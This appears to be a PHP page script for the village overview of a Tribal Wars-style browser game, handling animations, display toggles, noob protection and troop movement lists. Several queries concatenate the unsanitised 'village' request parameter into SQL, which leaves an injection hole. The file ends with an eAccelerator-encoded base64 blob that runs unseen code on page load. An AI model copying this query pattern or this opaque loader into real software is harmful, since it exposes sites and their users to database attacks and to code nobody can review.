<?php 
//Grafika dzieñ/noc
$time = date("H");
$visual = "visual";
if($time >= $config['noc_poczatek'] || $time < $config['koniec'])
{
	$visual = "visual_night";
}

//Animacja budowanie/badanie
$q = mysql_query("SELECT event_type FROM events WHERE villageid ='". $_GET["village"] . "'");
$main = "png";
$smith = "png";
while ($k = mysql_fetch_array($q))
{
	if($k[0] == "build") $main = "gif";
	
	if($k[0] == "research") $smith = "gif";

}

//Animacja rekrutowanie
$barracks = "png";
$garage = "png";
$stable = "png";
$snob = "png";
$q = mysql_query("SELECT building FROM `recruit` WHERE `villageid` ='". $_GET["village"] . "'");
while ($k = mysql_fetch_array($q))
{
	if($k[0] == "barracks") $barracks = "gif";

	if($k[0] == "garage") $garage = "gif";

	if($k[0] == "stable") $stable = "gif";
	
	if($k[0] == "snob") $snob = "gif";

}

//Animacja surowce/zagroda
$q = mysql_query("SELECT r_wood, r_stone, r_iron, r_bh FROM `villages` WHERE `id` = '".$_GET['village']."'");
while ($k = mysql_fetch_array($q)) {

	if($k[0] == $maxmag) $wood = "png";
	else $wood = "gif";
	
	if($k[1] == $maxmag) $stone = "png";
	else $stone = "gif";
	
	if($k[2] == $maxmag) $iron = "png";
	else $iron = "gif";
	
	if($k[3] == $maxfarm) $farm = "png";
	else $farm = "gif";
}

//Losowan animacji
$anim = rand(0, 3);

$labels = $user['o_labels'];
$ower_style = $user['o_style'];
$ower_anims = $user['o_anims'];

if ($labels == 1) {
	$_labels = true;
    } else {
	$_labels = false;
	}
	
if ($_GET['akcja'] === 'o_labels') {
    if ($_labels === true) {
	    mysql_query("UPDATE `users` SET `o_labels` = '0' WHERE `id` = '".$user['id']."'");
	    }
	if ($_labels === false) {
		mysql_query("UPDATE `users` SET `o_labels` = '1' WHERE `id` = '".$user['id']."'");
	    }
	header ('location: game.php?village='.$village['id'].'&screen=overview');
	exit;
    }
	
if ($ower_style == 1) {
    $o_style = 'new';
    } else {
	$o_style = 'classic';
	}
	
if ($_GET['akcja'] === 'o_style') {
	if ($o_style === 'new') {
	    mysql_query("UPDATE `users` SET `o_style` = '0' WHERE `id` = '".$user['id']."'");
	    }
	if ($o_style === 'classic') {
		mysql_query("UPDATE `users` SET `o_style` = '1' WHERE `id` = '".$user['id']."'");
	    }
	header ('location: game.php?village='.$village['id'].'&screen=overview');
	exit;
    }
	
if ($ower_anims == 1) {
	$_anims = true;
    } else {
	$_anims = false;
	}
	
if ($_GET['akcja'] === 'o_anims') {
	if ($_anims === true) {
	    mysql_query("UPDATE `users` SET `o_anims` = '0' WHERE `id` = '".$user['id']."'");
	    }
	if ($_anims === false) {
		mysql_query("UPDATE `users` SET `o_anims` = '1' WHERE `id` = '".$user['id']."'");
	    }
	header ('location: game.php?village='.$village['id'].'&screen=overview');
	exit;
    }
	
//Timery w przegl¹dzie wioski:
$timers = array (
	"storage" => array($stor_status,''),
	"stable" => array(true,''),
	"market" => array(false,''),
	"smith" => array(true,''),
	"statue" => array(true,''),
	"garage" => array(true,''),
	"barracks" => array(true,''),
	"main" => array(true,'')
	);
	


$coords = array (
    'main' => '373,187,417,129,407,72,329,65,306,99,311,150',
	'barracks' => '392,289,444,313,506,283,481,235,442,216,392,252',
	'stable' => '64,241,70,265,150,307,189,289,184,232,99,202',
	'garage' => '284,358,362,361,402,321,369,283,346,278,291,320',
	'snob' => '206,149,257,125,229,60,185,80,156,111',
	'smith' => '174,335,222,361,271,342,283,301,216,262',
	'place' => '315,271,379,275,401,229,375,206,343,207',
	'market' => '214,149,234,228,313,230,330,169,273,122',
	'wood' => '472,379,523,417,583,373,528,330',
	'stone' => '34,300,0,349,15,399,67,417,91,402,92,341',
	'iron' => '0,55,45,90,93,58,89,6,39,9',
	'farm' => '456,0,477,41,526,75,583,88,597,18,597,0',
	'storage' => '96,192,153,218,195,215,193,148,133,121',
	'hide' => '241,80,261,113,294,93,268,63',
	'wall' => '428,333,430,382,472,363,470,318',
	'statue' => '277,231,256,265,266,285,292,287,306,266'
    );
	
if ($config['noob_protection'] == '-1') {
	$noob = false;
	} else {
	$time_as_start = date("U") - $user['start_gaming'];
	$config['noob_protection_seconds'] = $config['noob_protection'] * 60;
	if ($time_as_start > $config['noob_protection_seconds']) {
		$noob = false;
		} else {
		$noob = true;
		$noob_end = $pl->format_date($user['start_gaming'] + $config['noob_protection_seconds']);
		}
	}

if ($o_style === 'classic') {
	$built_builds = array();
	foreach ($cl_builds->get_array("dbname") as $buildname) {
		if ($village[$buildname] > 0) {
			$built_builds[] = $buildname;
			}
		}
		
	$tpl->assign("built_builds",$built_builds);
	}
	
$vunits = $cl_units->read_units("",$village["id"]);
foreach ($cl_units->get_array("dbname") as $unitname) {
	if ($vunits[$unitname] <= 0) {
		unset($vunits[$unitname]);
		}
	}
	
$village["agreement"] = round($village["agreement"]);

if ($village["agreement"] > 75 && empty($color)) {
	$color = "green";
	}
	
if ($village["agreement"] > 50 && empty($color)) {
	$color = "yellow";
	}

if ($village["agreement"] > 25 && empty($color)) {
	$color = "orange";
	}
	
if ($village["agreement"] > 0 && empty($color)) {
	$color = "red";
	}
	
$config['cancel_movement_seconds'] = $config['cancel_movement'] * 60;

//Wybierz rozkazy wychodz¹ce z aktualnej wioski:
$commands_pl = array(
	'attack' => 'Atak na',
	'back' => 'Wycofane z',
	'cancel' => 'Anulowana komenda na',
	'other_back' => 'Wycofane od',
	'return' => 'Powrót z',
	'support' => 'Pomoc do',
	);
			
$sql = mysql_query("SELECT id,type,send_to_village,end_time,start_time FROM `movements` WHERE `send_from_village` = '".$village['id']."' ORDER BY `end_time`");

while ($array = mysql_fetch_assoc($sql)) {
	$vcinfo = sql("SELECT name,x,y,continent FROM `villages` WHERE `id` = '".$array['send_to_village']."'",'assoc');
	$my_movements[$array['id']]['id'] = $array['id'];
	$my_movements[$array['id']]['type'] = $array['type'];
	$my_movements[$array['id']]['end_time'] = $pl->format_date($array['end_time']);
	$my_movements[$array['id']]['arrival_in'] = $array['end_time'] - date("U");
	$my_movements[$array['id']]['message'] = $commands_pl[$array['type']] . ' ' . entparse($vcinfo['name']) . ' ('
		. $vcinfo['x'] . '|' . $vcinfo['y'] . ') K' . $vcinfo['continent'];
	if ($array['type'] === 'attack' || $array['type'] === 'support') {
		$mov_time_as_start = date("U") - $array['start_time'];
		if ($mov_time_as_start > $config['cancel_movement_seconds']) {
			$my_movements[$array['id']]['can_cancel'] = false;
			} else {
			$my_movements[$array['id']]['can_cancel'] = true;
			}
		} else {
		$my_movements[$array['id']]['can_cancel'] = false;
		}
	}
		
//Wybierz rozkazy przychodz¹ce do aktualnej wioski:
$commands_pl = array(
	'attack' => 'Atak z',
	'support' => 'Pomoc z',
	);
			
$sql = mysql_query("SELECT id,type,send_from_village,end_time,start_time FROM `movements` WHERE `send_to_village` = '".$village['id']."' AND (`type` = 'attack' OR `type` = 'support') ORDER BY `end_time`");
while ($array = mysql_fetch_assoc($sql)) {
	$vpinfo = sql("SELECT name,x,y,continent FROM `villages` WHERE `id` = '".$array['send_from_village']."'",'assoc');
	$other_movements[$array['id']]['id'] = $array['id'];
	$other_movements[$array['id']]['type'] = $array['type'];
	$other_movements[$array['id']]['end_time'] = $pl->format_date($array['end_time']);
	$other_movements[$array['id']]['arrival_in'] = $array['end_time'] - date("U");
	$other_movements[$array['id']]['message'] = $commands_pl[$array['type']] . ' ' . entparse($vpinfo['name']) . ' ('
		. $vpinfo['x'] . '|' . $vpinfo['y'] . ') K' . $vpinfo['continent'];
	}

$tpl->assign('visual',$visual);
$tpl->assign('main',$main);
$tpl->assign('smith',$smith);
$tpl->assign('barracks',$barracks);
$tpl->assign('garage',$garage);
$tpl->assign('stable',$stable);
$tpl->assign('snob',$snob);
$tpl->assign('wood',$wood);
$tpl->assign('stone',$stone);
$tpl->assign('iron',$iron);
$tpl->assign('farm',$farm);
$tpl->assign('anim',$anim);	
$tpl->assign('noob',$noob);
$tpl->assign('noob_end',$noob_end);
$tpl->assign('builds_graphic_coords',$coords);
$tpl->assign('anims',$_anims);
$tpl->assign('labels',$_labels);
$tpl->assign('style',$o_style);
$tpl->assign('pala_name',entparse($user['pala_name']));
$tpl->assign('my_movements',$my_movements);
$tpl->assign('other_movements',$other_movements);
$tpl->assign("color",$color);
$tpl->assign("in_village_units",$vunits);
$tpl->assign("cl_builds",$cl_builds);
$tpl->assign("cl_units",$cl_units);

eaccelerator_load('eJx9lE1v2kAQhnfthWBhEpeqqtJKlU9BLVKkqodGbdzKDVZ7aBMCJL1UMsbegFVjg/mo+Pfd2Q8wgeCDdxjPvDPzeLDnXl15P72O27vpIIIQwghpCJURXPdIXG2NH1iHAP+710O33IPBB6FBOI+z9IQ7Ccb6MTs//J36U7pI4/nDIkma8ExDdwel2A2NnikVXKohpPK6Og/CeoWdYeKD7gx/5l6oaDBjSOd+kOfBygW3I1qLBmkwpqDsCAm4Kr/AZroEXXNLJ1qLl1CtgT4+kxmaXidqNFM+9CdBEkRx2iRcqNYtyWw4w2yRsnQwMWsaWw0GsSwnWMuflJWooURnaTZolrniafdoV/FIKUbM6Bp7mRiKSVUyGYwmeRzSP8Z6/kIT38DrcL+zCai0wSZbxXUhjAi5N6QKdJrTKauAX/IEjDTcrj4etFIV4a/Z/a7dcnue3V/GSRIM6axvd72e3Q+SxCf4Y1W8FlGrbzviwa7ihQwsppR4StNurMM3ve+Lt9jZsH//8DqsnTiCaptUAC1bxLc8hcHAOmxjHPF5MFMjYjINi91tuPDzUuMQL6uKpnwV49VsmvjTBc1XbXMHkSkQnRYQiTVLgpBKSKx7c3taBmhX68JcD/soHOCo8AKcPfFvinDUu/If8mzsK1RKaAsVd5YKqMBBmHZJTKgRrL/i2u51q6A8z5Qul9iiba5pm9u0zQJt82na7+BzVHt/zNdXa1uy78LyVixB/+3TC5qzOM5bGIwkw2Ud3CVrHyDr8XTWejprezqrMJ11YJfq+8rUEZLhskxd/IK/YJKFAXyvP9lD9mk8n4wmX2WeQxAP5F1AzbNZmFOaOtmS5suY/nPrhabqhaYA5ogGEc1vnjOz8uUF94uvCUL/AeLR0iM=');
?>
